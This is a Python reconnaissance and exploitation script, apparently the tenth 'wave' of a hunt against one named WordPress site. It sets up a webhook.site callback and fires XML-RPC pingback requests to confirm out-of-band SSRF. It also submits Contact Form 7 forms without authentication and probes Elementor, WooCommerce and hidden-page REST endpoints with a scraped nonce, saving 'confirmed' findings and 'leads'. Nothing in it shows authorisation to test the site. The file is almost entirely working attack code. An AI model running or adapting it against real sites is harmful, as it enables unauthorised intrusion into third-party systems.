#!/usr/bin/env python3
"""Wave10: OOB pingback SSRF, CF7 multipart, Elementor, orphan pages."""
from __future__ import annotations

import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from pathlib import Path

TARGET = "https://kznvip.co.za"
OUT = Path("artifacts")
OUT.mkdir(exist_ok=True)
Path("out").mkdir(exist_ok=True)

R = {"ts": time.time(), "confirmed": [], "leads": [], "probes": {}}


def http(method, url, data=None, headers=None, timeout=35):
    h = {"User-Agent": "Mozilla/5.0 lurksek-wave10", "Accept": "*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, time.time() - t0, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        body = e.read() if hasattr(e, "read") else str(e).encode()
        return e.code, time.time() - t0, body, dict(getattr(e, "headers", {}) or {})
    except Exception as e:
        return 0, time.time() - t0, str(e).encode(), {}


def webhook_create():
    _, _, body, _ = http(
        "POST",
        "https://webhook.site/token",
        data=b"{}",
        headers={"Content-Type": "application/json"},
        timeout=20,
    )
    j = json.loads(body.decode("utf-8", "replace"))
    uid = j["uuid"]
    html = (
        f'<html><body><a href="{TARGET}/">link to target</a></body></html>'
    ).encode()
    http(
        "PUT",
        f"https://webhook.site/token/{uid}/settings",
        data=json.dumps(
            {
                "default_content": html.decode(),
                "default_content_type": "text/html",
                "default_status": 200,
            }
        ).encode(),
        headers={"Content-Type": "application/json"},
        timeout=20,
    )
    return uid, f"https://webhook.site/{uid}"


def webhook_requests(uid):
    c, _, body, _ = http("GET", f"https://webhook.site/token/{uid}/requests?sorting=newest", timeout=20)
    if c != 200:
        return []
    try:
        j = json.loads(body.decode("utf-8", "replace"))
        return j.get("data", [])
    except Exception:
        return []


# nonce
code, _, body, _ = http("GET", TARGET + "/")
html = body.decode("utf-8", "replace")
nonces = re.findall(r'"nonce"\s*:\s*"([a-f0-9]{8,12})"', html)
nonce = nonces[0] if nonces else "54b96dfe24"
R["nonce"] = nonce

# 1) OOB pingback
try:
    wh_id, wh_url = webhook_create()
    R["probes"]["webhook"] = {"id": wh_id, "url": wh_url}
    targets = [
        f"{TARGET}/",
        f"{TARGET}/about-us/",
        f"{TARGET}/wp-json/wp/v2/posts?per_page=1",
    ]
    # pick first post link if available
    c, _, b, _ = http("GET", f"{TARGET}/wp-json/wp/v2/posts?per_page=1")
    try:
        posts = json.loads(b.decode("utf-8", "replace"))
        if posts:
            targets.insert(0, posts[0].get("link", TARGET + "/"))
    except Exception:
        pass
    for tgt in targets[:3]:
        xml = (
            '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName>'
            f"<params><param><value><string>{wh_url}</string></value></param>"
            f"<param><value><string>{tgt}</string></value></param></params></methodCall>"
        ).encode()
        c, t, b, _ = http(
            "POST",
            TARGET + "/xmlrpc.php",
            data=xml,
            headers={"Content-Type": "text/xml"},
            timeout=45,
        )
        txt = b.decode("utf-8", "replace")
        fc = re.search(r"faultCode.*?<int>(-?\d+)</int>", txt, re.S)
        fs = re.search(r"faultString.*?<string>([^<]*)</string>", txt, re.S)
        key = "pingback_" + urllib.parse.quote(tgt, safe="")
        R["probes"][key] = {
            "target": tgt,
            "code": c,
            "faultCode": fc.group(1) if fc else None,
            "faultString": fs.group(1) if fs else None,
        }
        print("PING", tgt, c, fc.group(1) if fc else None, (fs.group(1) if fs else "")[:60])
    time.sleep(8)
    reqs = webhook_requests(wh_id)
    R["probes"]["webhook_hits"] = len(reqs)
    R["probes"]["webhook_sample"] = reqs[:3]
    print("OOB hits", len(reqs))
    if reqs:
        ua = reqs[0].get("user_agent") or reqs[0].get("headers", {}).get("user-agent", [""])[0]
        R["confirmed"].append(
            {
                "type": "xmlrpc_pingback_ssrf_oob",
                "webhook": wh_url,
                "hits": len(reqs),
                "user_agent": ua,
            }
        )
except Exception as e:
    R["probes"]["oob_error"] = str(e)
    print("OOB err", e)

# 2) CF7 multipart feedback (ids 1-5)
for fid in range(1, 6):
    boundary = "----F" + uuid.uuid4().hex[:8]
    parts = []
    for k, v in [
        ("_wpcf7", str(fid)),
        ("_wpcf7_version", "5.8.5"),
        ("_wpcf7_locale", "en_US"),
        ("your-name", "test"),
        ("your-email", "test@example.com"),
        ("your-message", "probe"),
    ]:
        parts.append(
            f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode()
        )
    parts.append(f"--{boundary}--\r\n".encode())
    c, _, b, _ = http(
        "POST",
        f"{TARGET}/wp-json/contact-form-7/v1/contact-forms/{fid}/feedback",
        data=b"".join(parts),
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    t = b[:200].decode("utf-8", "replace")
    R["probes"][f"cf7m_{fid}"] = {"code": c, "body": t}
    if c in (200, 201) and "mail_sent" in t:
        R["leads"].append({"type": "cf7_unauth_submit", "form_id": fid, "body": t[:300]})

# 3) Elementor / Woo store
for path in [
    "/wp-json/elementor/v1/template-library/templates",
    "/wp-json/elementor/v1/globals",
    "/wp-json/wc/store/products?per_page=5",
    "/wp-json/wp/v2/pages?slug=securityold&context=view",
]:
    c, _, b, _ = http(
        "GET",
        TARGET + path,
        headers={"Accept": "application/json", "X-WP-Nonce": nonce},
    )
    t = b[:350].decode("utf-8", "replace")
    R["probes"][path] = {"code": c, "body": t[:300]}
    if c == 200 and "rest_forbidden" not in t and "securityold" not in path:
        if "template" in path.lower() or "globals" in path:
            R["leads"].append({"type": "unauth_rest", "path": path, "body": t[:400]})

for p in (OUT / "hunt_wave10.json", Path("out/hunt_wave10.json")):
    p.write_text(json.dumps(R, indent=2, default=str))
print("DONE confirmed", len(R["confirmed"]), "leads", len(R["leads"]))
